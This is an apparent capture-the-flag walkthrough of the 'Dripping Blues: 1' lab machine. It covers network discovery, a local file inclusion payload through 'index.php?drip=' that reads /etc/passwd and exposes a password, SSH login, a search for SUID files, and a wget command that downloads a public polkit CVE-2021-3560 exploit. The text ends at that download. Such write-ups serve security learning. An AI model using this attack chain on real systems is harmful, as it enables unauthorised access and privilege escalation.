# Dripping Blues: 1

First step as always is to run the **netdiscover** command to see what IPs are currently live on the network. I can see the **192.168.146.130** address is going to be tagret machine's IP. I will then ping that address to confirm it'll send me ICMP packets which it did.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/8d4669e6-4f12-48f5-bafc-5ef00752bf6e" />

I will now run a nmap scan to see which ports are open. I can see port 80 is open with two available file paths to append to the URL, **/dripisreal.txt** and **/etc/dripispowerful.html** which means I can then go into Firefox and identify what that web app is.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/98a02c44-5e0e-4877-bc3b-f2a70d850721" />
<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/980ed553-7d62-4940-b7e8-3dda2d33d9e9" />


This is what appears when appending **/dripisreal.txt** to the IP address in Firefox.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/5951580b-cc4d-414a-86d4-cf3084980686" />

This doesn't give us a whole lot of information so I am now going to append **index.php?drip=/etc/dripispowerful.html** to see what renders. Obivously this is an interesting image with some black text over it, however, it's difficult to read the text so I can simply just inspect the page to see the HTML. After opening the body, the password is listed right there: **imdrippinbiatch**

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/41171613-e7fe-4b95-9968-bc4f7c22d092" />

I checked to see if the **/etc/passwd** file would display the contents of it which it looks like it did.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/f51168ea-a33f-49e7-9aec-626bb63effb0" />

I can see in the bottom left corner the username **thugger** which means this will be a quick and easy ssh into that account. I accessed my root terminal and used the command **ssh thugger@192.168.146.130**. I am then prompted with being asked if I'd like to continue the connection which I say yes to. Finally, I'll enter the password that was displayed in the body of the HTML earlier which allows for a successful logi.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/c3575a14-6877-4ba9-851e-4c7224bd24cf" />

First thing's first, I wanted to see what was in the home directory so I used a ls command. I then wanted to display the content of the user.txt file so I used **cat user.txt**. To find regular files, I then used the **find / -perm -u=s -type f 2>/dev/null** command and found a file called **/usr/lib/policykit-1/polkit-agent-helper-1**. I looked this up online and found a python script in someone's github repo so I copied the URL of the raw code and ran the command **wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/refs/heads/main/CVE-2021-3560.py**. 

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/182daa93-230c-4a66-9feb-a12a8d9cf67c" />
